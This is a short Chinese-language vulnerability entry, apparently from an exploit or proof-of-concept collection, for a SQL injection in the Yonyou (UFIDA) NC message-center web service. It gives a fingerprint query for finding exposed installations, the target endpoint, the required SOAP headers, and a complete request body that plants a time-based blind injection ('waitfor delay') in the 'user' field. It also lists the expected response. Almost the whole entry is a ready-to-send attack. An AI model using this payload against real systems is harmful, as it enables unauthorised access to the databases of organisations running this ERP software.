# 用友NCIMsgCenterWebService存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /uapws/service/nc.itf.msgcenter.IMsgCenterWebService HTTP/1.1`
- **关键头**：`SOAPAction: urn:doAction`　`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ims="http://msgcenter.itf.nc/IMsgCenterWebService">
<soapenv:Header/>
<soapenv:Body>
<ims:doAction>
<!--type: string-->
<dataSource>NC65</dataSource>
<!--type: string-->
<actionCode>test</actionCode>
<!--type: string-->
<pluginType>test</pluginType>
<!--type: string-->
<param>{"user":"'waitfor delay'0:0:5","pk_sourcemsg":""}</param>
</ims:doAction>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　—